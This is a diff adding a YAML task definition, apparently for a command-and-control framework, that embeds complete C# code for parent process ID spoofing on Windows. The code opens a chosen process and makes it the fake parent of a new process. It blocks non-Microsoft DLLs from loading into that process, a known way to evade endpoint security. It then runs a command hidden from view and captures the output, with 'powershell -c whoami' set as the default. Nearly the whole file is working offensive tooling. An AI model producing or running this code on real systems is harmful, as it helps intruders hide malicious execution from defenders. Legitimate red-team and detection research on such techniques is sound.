@@ -1,0 +1,120 @@
+- Name: PPIDSpoof
+  Aliases: []
+  Author:
+    Name: Chinedu Onwukike
+    Handle: '@pytharmani'
+    Link: https://github.com/py7hagoras
+  Description: Task to spoof Process ID
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: "using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\nusing System.Runtime.InteropServices;\nusing Microsoft.Win32.SafeHandles;\nusing System.IO;\n\n\n    public class Task\n    {\n        public static string Execute(string ProcID, string CommandToExecute)\n        {\n                    \n            int newParentProcId = int.Parse(ProcID);\n           \n			string command = CommandToExecute;\n         \n            string result = UnmanagedExecute.CreateProcess(newParentProcId, command);\n    \n            return result;\n\n        }\n    }\n\n    class UnmanagedExecute\n    {\n        [DllImport(\"kernel32.dll\")]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        static extern bool CreateProcess(\n            string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,\n            ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,\n            IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo,\n            out PROCESS_INFORMATION lpProcessInformation);\n\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);\n\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        public static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds);\n\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        private static extern bool UpdateProcThreadAttribute(\n            IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,\n            IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);\n\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        private static extern bool InitializeProcThreadAttributeList(\n            IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);\n\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        private static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);\n\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        static extern bool SetHandleInformation(IntPtr hObject, HANDLE_FLAGS dwMask,\n           HANDLE_FLAGS dwFlags);\n\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        static extern bool PeekNamedPipe(IntPtr handle,\n            IntPtr buffer, IntPtr nBufferSize, IntPtr bytesRead,\n            ref uint bytesAvail, IntPtr BytesLeftThisMessage);\n\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        static extern bool CloseHandle(IntPtr hObject);\n\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,\n           IntPtr hSourceHandle, IntPtr hTargetProcessHandle, ref IntPtr lpTargetHandle,\n           uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);\n\n        [DllImport(\"kernel32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\n        public static extern int GetConsoleOutputCP();\n\n        [DllImport(\"kernel32.dll\")]\n        static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe,\n           ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);\n\n        public static string CreateProcess(int parentProcessId, string command)\n        {\n            // STARTUPINFOEX members\n            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;\n            const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;\n\n            // Block non-Microsoft signed DLL's\n            const long PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;\n\n            // STARTUPINFO members (dwFlags and wShowWindow)\n            const int STARTF_USESTDHANDLES = 0x00000100;\n            const int STARTF_USESHOWWINDOW = 0x00000001;\n            const short SW_HIDE = 0x0000;\n\n            // dwCreationFlags\n            const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;\n            const uint CREATE_NO_WINDOW = 0x08000000;\n\n            // WaitForSingleObject INFINITE\n            // const UInt32 INFINITE = 0xFFFFFFFF;\n            var error = Marshal.GetLastWin32Error();\n\n            // DuplicateHandle\n            const uint DUPLICATE_CLOSE_SOURCE = 0x00000001;\n            const uint DUPLICATE_SAME_ACCESS = 0x00000002;\n\n            // https://msdn.microsoft.com/en-us/library/ms682499(VS.85).aspx\n            // Handle stuff\n            var saHandles = new SECURITY_ATTRIBUTES();\n            saHandles.nLength = Marshal.SizeOf(saHandles);\n            saHandles.bInheritHandle = true;\n            saHandles.lpSecurityDescriptor = IntPtr.Zero;\n\n            IntPtr hStdOutRead;\n            IntPtr hStdOutWrite;\n            // Duplicate handle created just in case\n            IntPtr hDupStdOutWrite = IntPtr.Zero;\n\n            // Create the pipe and make sure read is not inheritable\n            CreatePipe(out hStdOutRead, out hStdOutWrite, ref saHandles, 0);\n            SetHandleInformation(hStdOutRead, HANDLE_FLAGS.INHERIT, 0);\n\n            var pInfo = new PROCESS_INFORMATION();\n            var siEx = new STARTUPINFOEX();\n\n            // Be sure to set the cb member of the STARTUPINFO structure to sizeof(STARTUPINFOEX).\n            siEx.StartupInfo.cb = Marshal.SizeOf(siEx);\n            IntPtr lpValueProc = IntPtr.Zero;\n            IntPtr hSourceProcessHandle = IntPtr.Zero;\n\n            // Values will be overwritten if parentProcessId > 0\n            siEx.StartupInfo.hStdError = hStdOutWrite;\n            siEx.StartupInfo.hStdOutput = hStdOutWrite;\n\n            try\n            {\n                if (parentProcessId > 0)\n                {\n                    var lpSize = IntPtr.Zero;\n                    var success = InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);\n                    if (success || lpSize == IntPtr.Zero)\n                    {\n                        return \"false\";\n                    }\n\n                    siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);\n                    success = InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);\n                    if (!success)\n                    {\n                        return \"false\";\n                    }\n                    \n                    IntPtr lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);\n                    Marshal.WriteInt64(lpMitigationPolicy, PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);\n\n                    // Add Microsoft-only DLL protection\n                    success = UpdateProcThreadAttribute(\n                        siEx.lpAttributeList,\n                        0,\n                        (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,\n                        lpMitigationPolicy,\n                        (IntPtr)IntPtr.Size,\n                        IntPtr.Zero,\n                        IntPtr.Zero);\n                    if (!success)\n                    {\n                        Console.WriteLine(\"[!] Failed to set process mitigation policy\");\n                        return \"false\";\n                    }\n\n                    IntPtr parentHandle = OpenProcess(ProcessAccessFlags.CreateProcess | ProcessAccessFlags.DuplicateHandle, false, parentProcessId);\n                    // This value should persist until the attribute list is destroyed using the DeleteProcThreadAttributeList function\n                    lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);\n                    Marshal.WriteIntPtr(lpValueProc, parentHandle);\n\n                    success = UpdateProcThreadAttribute(\n                        siEx.lpAttributeList,\n                        0,\n                        (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,\n                        lpValueProc,\n                        (IntPtr)IntPtr.Size,\n                        IntPtr.Zero,\n                        IntPtr.Zero);\n                    if (!success)\n                    {\n                        return \"false\";\n                    }\n\n                    IntPtr hCurrent = System.Diagnostics.Process.GetCurrentProcess().Handle;\n                    IntPtr hNewParent = OpenProcess(ProcessAccessFlags.DuplicateHandle, true, parentProcessId);\n\n                    success = DuplicateHandle(hCurrent, hStdOutWrite, hNewParent, ref hDupStdOutWrite, 0, true, DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS);\n                    if (!success)\n                    {\n                        error = Marshal.GetLastWin32Error();\n                        return \"false\";\n                    }\n\n                    error = Marshal.GetLastWin32Error();\n                    siEx.StartupInfo.hStdError = hDupStdOutWrite;\n                    siEx.StartupInfo.hStdOutput = hDupStdOutWrite;\n                }\n                \n                siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;\n                siEx.StartupInfo.wShowWindow = SW_HIDE;\n\n                var ps = new SECURITY_ATTRIBUTES();\n                var ts = new SECURITY_ATTRIBUTES();\n                ps.nLength = Marshal.SizeOf(ps);\n                ts.nLength = Marshal.SizeOf(ts);\n                bool ret = CreateProcess(null, command, ref ps, ref ts, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);\n                if(!ret)\n                {\n                    Console.WriteLine(\"[!] Proccess failed to execute!\");\n                    return \"false\";\n                }\n                SafeFileHandle safeHandle = new SafeFileHandle(hStdOutRead, false);\n                var encoding = Encoding.GetEncoding(GetConsoleOutputCP());\n                var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), encoding, true);\n                string result = \"\";\n                bool exit = false;\n                try\n                {\n                    do\n                    {\n                        if(WaitForSingleObject(pInfo.hProcess, 100) == 0)\n                        {\n                            exit = true;\n                        }\n                        \n                        char[] buf = null;\n                        int bytesRead;\n\n                        uint bytesToRead = 0;\n\n                        bool peekRet = PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero);\n\n                        if (peekRet == true && bytesToRead == 0)\n                        {\n                            if (exit == true)\n                            {\n                                Console.WriteLine(\"Command executed.\");\n                                break;\n                            }\n                            else\n                            {\n                                continue;\n                            }\n                        }\n\n                        if (bytesToRead > 4096)\n                            bytesToRead = 4096;\n\n                        buf = new char[bytesToRead];\n                        bytesRead = reader.Read(buf, 0, buf.Length);\n                        if (bytesRead > 0)\n                        {\n                            Console.WriteLine(String.Format(\"[+] {0} bytes read\", bytesRead));\n                            result += new string(buf);\n                        }\n                        \n                    }while(true);\n                    reader.Close();\n                }\n                finally\n                {\n                    if (!safeHandle.IsClosed)\n                    {\n                        safeHandle.Close();\n                    }\n                }\n\n                if (hStdOutRead != IntPtr.Zero)\n                {\n                    CloseHandle(hStdOutRead);\n                }\n                Console.WriteLine(result);\n                //return true;\n              	return result;\n\n\n            }\n            finally\n            {\n                // Free the attribute list\n                if (siEx.lpAttributeList != IntPtr.Zero)\n                {\n                    DeleteProcThreadAttributeList(siEx.lpAttributeList);\n                    Marshal.FreeHGlobal(siEx.lpAttributeList);\n                }\n                Marshal.FreeHGlobal(lpValueProc);\n\n                // Close process and thread handles\n                if (pInfo.hProcess != IntPtr.Zero)\n                {\n                    CloseHandle(pInfo.hProcess);\n                }\n                if (pInfo.hThread != IntPtr.Zero)\n                {\n                    CloseHandle(pInfo.hThread);\n                }\n            }\n        }\n\n        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\n        struct STARTUPINFOEX\n        {\n            public STARTUPINFO StartupInfo;\n            public IntPtr lpAttributeList;\n        }\n\n        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\n        struct STARTUPINFO\n        {\n            public Int32 cb;\n            public string lpReserved;\n            public string lpDesktop;\n            public string lpTitle;\n            public Int32 dwX;\n            public Int32 dwY;\n            public Int32 dwXSize;\n            public Int32 dwYSize;\n            public Int32 dwXCountChars;\n            public Int32 dwYCountChars;\n            public Int32 dwFillAttribute;\n            public Int32 dwFlags;\n            public Int16 wShowWindow;\n            public Int16 cbReserved2;\n            public IntPtr lpReserved2;\n            public IntPtr hStdInput;\n            public IntPtr hStdOutput;\n            public IntPtr hStdError;\n        }\n\n        [StructLayout(LayoutKind.Sequential)]\n        internal struct PROCESS_INFORMATION\n        {\n            public IntPtr hProcess;\n            public IntPtr hThread;\n            public int dwProcessId;\n            public int dwThreadId;\n        }\n\n        [StructLayout(LayoutKind.Sequential)]\n        public struct SECURITY_ATTRIBUTES\n        {\n            public int nLength;\n            public IntPtr lpSecurityDescriptor;\n            [MarshalAs(UnmanagedType.Bool)]\n            public bool bInheritHandle;\n        }\n\n        [Flags]\n        public enum ProcessAccessFlags : uint\n        {\n            All = 0x001F0FFF,\n            Terminate = 0x00000001,\n            CreateThread = 0x00000002,\n            VirtualMemoryOperation = 0x00000008,\n            VirtualMemoryRead = 0x00000010,\n            VirtualMemoryWrite = 0x00000020,\n            DuplicateHandle = 0x00000040,\n            CreateProcess = 0x000000080,\n            SetQuota = 0x00000100,\n            SetInformation = 0x00000200,\n            QueryInformation = 0x00000400,\n            QueryLimitedInformation = 0x00001000,\n            Synchronize = 0x00100000\n        }\n\n        [Flags]\n        enum HANDLE_FLAGS : uint\n        {\n            None = 0,\n            INHERIT = 1,\n            PROTECT_FROM_CLOSE = 2\n        }\n\n        [Flags]\n        public enum DuplicateOptions : uint\n        {\n            DUPLICATE_CLOSE_SOURCE = 0x00000001,\n            DUPLICATE_SAME_ACCESS = 0x00000002\n        }\n    }"
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: ProcID
+    Value: 4020
+    DefaultValue: ''
+    Description: Parent process to spoof
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: CommandToExecute
+    Value: powershell -c whoami
+    DefaultValue: ''
+    Description: Command to execute
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: System.Configuration.Install.dll
+    Location: net35/System.Configuration.Install.dll
+    DotNetVersion: Net35
+  - Name: System.XML.dll
+    Location: net40/System.XML.dll
+    DotNetVersion: Net40
+  - Name: System.IdentityModel.dll
+    Location: net40/System.IdentityModel.dll
+    DotNetVersion: Net40
+  - Name: System.dll
+    Location: net40/System.dll
+    DotNetVersion: Net40
+  - Name: System.Security.dll
+    Location: net40/System.Security.dll
+    DotNetVersion: Net40
+  - Name: System.Core.dll
+    Location: net40/System.Core.dll
+    DotNetVersion: Net40
+  - Name: System.ServiceProcess.dll
+    Location: net40/System.ServiceProcess.dll
+    DotNetVersion: Net40
+  - Name: System.Data.DataSetExtensions.dll
+    Location: net40/System.Data.DataSetExtensions.dll
+    DotNetVersion: Net40
+  - Name: System.Drawing.dll
+    Location: net40/System.Drawing.dll
+    DotNetVersion: Net40
+  - Name: System.DirectoryServices.dll
+    Location: net40/System.DirectoryServices.dll
+    DotNetVersion: Net40
+  - Name: System.Web.Extensions.dll
+    Location: net40/System.Web.Extensions.dll
+    DotNetVersion: Net40
+  - Name: System.Management.Automation.dll
+    Location: net40/System.Management.Automation.dll
+    DotNetVersion: Net40
+  - Name: mscorlib.dll
+    Location: net40/mscorlib.dll
+    DotNetVersion: Net40
+  - Name: System.Data.dll
+    Location: net40/System.Data.dll
+    DotNetVersion: Net40
+  - Name: System.Management.dll
+    Location: net35/System.Management.dll
+    DotNetVersion: Net35
+  - Name: System.DirectoryServices.AccountManagement.dll
+    Location: net35/System.DirectoryServices.AccountManagement.dll
+    DotNetVersion: Net35
+  - Name: System.IdentityModel.dll
+    Location: net35/System.IdentityModel.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35/System.dll
+    DotNetVersion: Net35
+  - Name: System.Security.dll
+    Location: net35/System.Security.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35/System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net35/mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.Management.Automation.dll
+    Location: net35/System.Management.Automation.dll
+    DotNetVersion: Net35
+  - Name: System.Web.Extensions.dll
+    Location: net35/System.Web.Extensions.dll
+    DotNetVersion: Net35
+  - Name: System.DirectoryServices.dll
+    Location: net35/System.DirectoryServices.dll
+    DotNetVersion: Net35
+  - Name: System.Data.DataSetExtensions.dll
+    Location: net35/System.Data.DataSetExtensions.dll
+    DotNetVersion: Net35
+  - Name: System.Windows.Forms.dll
+    Location: net35/System.Windows.Forms.dll
+    DotNetVersion: Net35
+  - Name: System.ServiceProcess.dll
+    Location: net35/System.ServiceProcess.dll
+    DotNetVersion: Net35
+  - Name: System.Data.dll
+    Location: net35/System.Data.dll
+    DotNetVersion: Net35
+  EmbeddedResources: []
